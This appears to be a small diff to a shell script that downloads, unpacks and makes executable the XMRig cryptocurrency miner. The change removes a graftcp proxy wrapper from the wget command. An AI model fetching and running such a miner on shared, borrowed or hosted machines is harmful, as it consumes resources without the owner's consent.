@@ -37,7 +37,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz
 tar -zxf xmrig-6.16.2-bionic-x64.tar.gz
 cd xmrig-6.16.2
 chmod +x xmrig
